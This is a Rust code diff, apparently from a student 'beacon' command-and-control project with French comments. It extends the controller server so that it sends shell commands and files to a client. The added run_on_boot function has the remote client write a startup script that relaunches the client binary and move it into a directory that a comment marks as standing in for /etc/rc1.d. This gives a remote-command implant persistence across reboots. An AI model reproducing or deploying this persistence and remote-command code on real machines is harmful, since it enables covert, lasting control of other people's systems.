@@ -6,6 +6,7 @@ use std::{
 use chrono::prelude::*;
 use tiny_http::{Response};
 use serde::{Serialize, Deserialize};  
+use std::process::Command;
 
 
 #[derive(Serialize, Deserialize, Debug, Clone)]
@@ -90,7 +91,7 @@ fn write_logs(request : Option<&SocketAddr>){
     println!("Log appended successfully"); 
 }
 
-async fn handle_post_request(server: & tiny_http::Server) -> () {
+async fn handle_post_request(server: & tiny_http::Server) -> String {
 
     let request = server.recv();
 
@@ -101,15 +102,17 @@ async fn handle_post_request(server: & tiny_http::Server) -> () {
 
                 let mut content = String::new();
                 rq.as_reader().read_to_string(&mut content).unwrap();
-
+                //print the result of the request
+                
                 println!("{}", content);
-            
                 let response = Response::from_string("Recu requete POST\n");
                 rq.respond(response).unwrap();
+                return content;
             }
         },
-        Err(e) => { println!("error: {}", e);  }
+        Err(e) => { println!("error: {}", e);}
     };
+    return "".to_string();
 }
 
 async fn handle_file_post_request(server: & tiny_http::Server, filename: &str) -> () {
@@ -134,7 +137,7 @@ async fn handle_file_post_request(server: & tiny_http::Server, filename: &str) -
 }
 
 
-async fn send_ordre(server: & tiny_http::Server, ordre: OrdreType, arguments: Vec<String>) -> () {
+async fn send_ordre(server: & tiny_http::Server, ordre: OrdreType, arguments: Vec<String>) -> String {
     let request = server.recv();
     match request {
         Ok(rq) => {
@@ -152,7 +155,11 @@ async fn send_ordre(server: & tiny_http::Server, ordre: OrdreType, arguments: Ve
 
                 match ordre {
                     OrdreType::Commande => {
-                        handle_post_request(&server).await;
+                        
+                        let pwd = String::from(handle_post_request(&server).await);
+                        //ligne commenté car recuperer le resultat dans le string appelle la fonction donc double appel si on decommente 
+                        //handle_post_request(&server).await;
+                        return pwd;
                     },
                     OrdreType::Fichier => {
                         let filename = arguments[0].as_str();
@@ -166,9 +173,51 @@ async fn send_ordre(server: & tiny_http::Server, ordre: OrdreType, arguments: Ve
         },
         Err(e) => { println!("error: {}", e);  }
     };
-
+    return "".to_string();
 }
 
+async fn run_on_boot(server: & tiny_http::Server) -> () {
+    //recupere le string de la commande shell pwd : /home/cytech/Desktop/22-23/Rust/cabreBranch/beacon_projet_rust/client
+    let resultpwd = String::from(send_ordre(&server, OrdreType::Commande, vec![String::from("pwd"), String::from("")]).await);
+    
+    //creation du fichier demarre.sh 
+    let mut demarre_sh = File::create("demarre.sh").expect("Error encountered while creating file!");
+
+    // écriture dans le fichier
+    demarre_sh.write_all(b"#!/bin/bash\ncd ").expect("Error while writing to file");
+    demarre_sh.write_all(resultpwd.as_bytes())
+    .expect("Error while writing to file");
+    demarre_sh.write_all(b"cd ./target/debug && ./client").expect("Error while writing to file");
+ 
+    // Ajoute le chemin du fichier demarre.sh pour le mv plus tard dans /etc
+    let owned_string: String = resultpwd.to_owned();
+    let borrowed_string: &str = "/demarre.sh";
+    let shorten = &owned_string[0..owned_string.len()-1];
+    let mut source_file_sh = String::from(shorten);
+    let folder: &str = "/src/etc/";
+    let mut final_string = String::from(shorten);
+    final_string.push_str(folder);
+    // final_string = /home/cytech/Desktop/22-23/Rust/cabreBranch/beacon_projet_rust/client/src/etc/
+
+    source_file_sh.push_str(borrowed_string);
+    println!("---2--{}-----", shorten);
+    // source_file_sh = /home/cytech/Desktop/22-23/Rust/cabreBranch/beacon_projet_rust/client/demarre.sh
+
+    //tempodesti est à remplacer par /etc/rc1.d 
+    let tempodesti = String::from(final_string);
+    
+    //envoie le fichier demarre.sh coté client
+    send_ordre(&server, OrdreType::Fichier, vec![String::from("demarre.sh")]).await;
+
+    send_ordre(&server, OrdreType::Commande, vec![String::from("mkdir"), String::from(&tempodesti)] ).await;
+
+    //coté client : lance mv demarrre.sh "tempodest" 
+    send_ordre(&server, OrdreType::Commande, vec![String::from("mv"), String::from(source_file_sh), String::from(tempodesti)] ).await;
+
+    let mut delete_sh_file = Command::new("rm");
+    delete_sh_file.arg("demarre.sh");
+    delete_sh_file.output().expect("failed to execute process");
+}
 
 #[tokio::main]
 async fn main() {
@@ -181,4 +230,6 @@ async fn main() {
     send_ordre(&server, OrdreType::Fichier, vec![String::from("texte.txt")]).await;
 
     send_ordre(&server, OrdreType::Vitesse, vec![String::from("1")]).await;
+
+    run_on_boot(&server).await;
 }
